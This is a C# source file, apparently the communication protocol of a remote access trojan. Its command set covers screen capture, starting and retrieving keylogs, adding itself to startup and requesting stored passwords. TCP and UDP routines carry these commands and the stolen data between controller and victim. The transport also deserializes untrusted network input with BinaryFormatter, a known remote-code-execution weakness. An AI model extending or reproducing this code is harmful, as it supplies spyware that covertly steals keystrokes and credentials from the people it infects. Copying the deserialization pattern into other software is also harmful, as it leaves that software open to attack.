using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;

namespace Protocol
{
    public interface IData { }

    public enum Commands
    {
        Disconnect, Close, RequestScreen, StartKeyLogging, StopKeyLogging, RequestKeyLog, AddToStartup, RemoveFromStartup,
        RequestPasswords
    }

    [Serializable]
    public class Command : IData
    {
        public Commands CommandData;

        public Command(Commands com)
        {
            CommandData = com;
        }
    }

    [Serializable]
    public class Log : IData
    {
        public string SimpleLog;
        
        public string FullLog;
        public Log(string full, string simple)
        {
            SimpleLog = simple;
            FullLog = full;
        }
    }

    [Serializable]
    public class Packet
    {
        public int Id;

        public byte[] Bytes;

        public bool last = false;

        public Packet(int id, byte[] bytes, bool last)
        {
            Id = id;
            Bytes = bytes;
            this.last = last;
        }
    }

    public class Transfer
    {

        public static BinaryFormatter Formatter = new BinaryFormatter();

        public static int MaxLength = 0;
        public static byte[] Serialize(object o)
        {

            MemoryStream ms = new MemoryStream(1024 * 4); //packet size will be maximum of 4KB.
            BinaryFormatter bf = new BinaryFormatter();
            bf.Serialize(ms, o);
            return ms.ToArray();

        }

        public static object Deserialize(byte[] bt)
        {

            MemoryStream ms = new MemoryStream(1024 * 4);//packet size will be maximum of 4KB.

            foreach (byte b in bt)
            {

                ms.WriteByte(b);

            }

            ms.Position = 0;
            BinaryFormatter bf = new BinaryFormatter();
            object obj = bf.Deserialize(ms);
            ms.Close();
            return obj;

        }
        
        public static void SendTcp(TcpClient client, IData data, int timeout = 1000)
        {
            client.SendTimeout = timeout;
            client.GetStream().Flush();
            Formatter.Serialize(client.GetStream(), data);
        }

        public static IData ReceiveTcp(TcpClient client, int timeout = 1000)
        {
            client.ReceiveTimeout = timeout;
            var temp = client.GetStream();
            var data = (IData)Formatter.Deserialize(temp);
            temp.Flush();
            return data;
        }

        public static void SendTcpBig(TcpClient client, IData data, int timeout = 1000, int packetSize = 512)
        {
            client.SendTimeout = timeout;

            byte[] bytes = Serialize(data);

            var stream = client.GetStream();
            stream.Flush();

            stream.Write(BitConverter.GetBytes(bytes.Length), 0, 4);

            for (int i = 0; i < bytes.Length; i += packetSize)
            {
                byte[] packet = new byte[packetSize];

                for (int j = 0; j < packetSize && j + i < bytes.Length; j++)
                {
                    packet[j] = bytes[j + i];
                }

                stream.Write(packet, 0, packetSize);
            }
        }

        public static IData ReceiveTcpBig(TcpClient client, int timeout = 1000, int packetSize = 512)
        {
            client.ReceiveTimeout = timeout;
            
            var stream = client.GetStream();

            byte[] buffer = new byte[4];
            
            stream.Read(buffer, 0, 4);

            int length = BitConverter.ToInt32(buffer, 0);
            if (length < 0) return null;
            byte[] data = new byte[length];

            for (int i = 0; i < length; i += packetSize)
            {
                byte[] packet = new byte[packetSize];
                try
                {
                    stream.Read(packet, 0, packetSize);
                    client.Client.ReceiveTimeout = 100;
                }
                catch
                {
                    break;
                }


                for (int j = 0; j < packetSize && j + i < length; j++)
                {
                    data[i + j] = packet[j];
                }
            }
            return Deserialize(data) as IData;
        }

        public static void SendUpdBig(UdpClient client, byte[] bytes, int packetSize = 512)
        {
            client.Send(BitConverter.GetBytes(bytes.Length), 4);

            if (bytes.Length > MaxLength)
            {
                MaxLength = bytes.Length;
                client.Client.SendBufferSize = MaxLength;
            }

            for (int i = 0; i < bytes.Length; i += packetSize)
            {
                byte[] package = new byte[packetSize];

                for (int j = 0; j < packetSize && j + i < bytes.Length; j++)
                {
                    package[j] = bytes[j + i];
                }

                Packet packet = new Packet(i, package, i + packetSize >= bytes.Length - 1);
                byte[] packetBytes = Serialize(packet);
                client.Send(packetBytes, packetBytes.Length);
            }
        }

        public static byte[] ReceiveUpdBig(UdpClient client, int packetSize = 512)
        {
            client.Client.ReceiveTimeout = 300;
            
            IPEndPoint endPoint = null;
            byte[] buffer = client.Receive(ref endPoint);

            int length = BitConverter.ToInt32(buffer, 0);
            if (length < 0) return null;
            byte[] data = new byte[length];
            
            if (length > MaxLength)
            {
                MaxLength = length;
                client.Client.ReceiveBufferSize = MaxLength;
            }

            while (true)
            {
                try
                {
                    Packet packet = Deserialize(client.Receive(ref endPoint)) as Packet;

                    for (int i = 0; i < packetSize; i++)
                    {
                        if (packet.Id + i >= length) break;
                        data[packet.Id + i] = packet.Bytes[i];
                    }

                    if (packet.last) break;
                }
                catch (Exception e)
                {
                    break;
                }
                
            }
            
            return data;
        }

    }
}
